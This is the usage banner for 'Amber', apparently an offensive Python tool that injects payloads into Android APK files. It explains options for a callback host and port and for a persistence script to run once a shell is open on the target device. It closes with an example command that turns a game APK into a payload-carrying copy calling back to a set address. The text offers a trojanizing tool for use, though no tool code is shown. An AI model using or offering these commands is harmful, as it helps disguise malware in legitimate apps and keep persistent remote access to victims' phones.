    / \   _ __ ___ | |__   ___ _ __ 
   / _ \ | '_ ` _ \| '_ \ / _ \ '__|
  / ___ \| | | | | | |_) |  __/ | 
 /_/   \_\_| |_| |_|_.__/ \___|_| 

  An Android Package Injection Script
       ------------------
 Version:1.1
 Author:sunRider
 
 The script is used to provide embedded payloads in android with
 persistence support the script is able to generate a script too
 which can be executed when a shell is opened in the target device
 to achieve persistence of the payload embedded in the apk.

 Usage: python amber [options] [options]
  Options:
  -l [ipadr], --LHOST [ipadr]: Set the lhost ipaddress of the payload
  -p [port],  --LPORT [port] : Set the port which the payload communicates to
  -i [file_location], --input [file_location] : The input file location
  -o [destination_location], --output [destination_location] : The output file name and location,defaults to
                                                               the program directory saved as output.apk
  -s [destination_location], --script_out [destination_location] : The location of the persistence script to be saved to,defaults to program
                                                                   directory saved as script.sh Note! this should end in '.sh' with filename
  -h, --help : Displays this help dialogue

 Example: python amber.py --LHOST 192.168.43.2 --LPORT 8888 --input game.apk --output embedded_game.apk --script_out "~/Desktop/script.sh" 

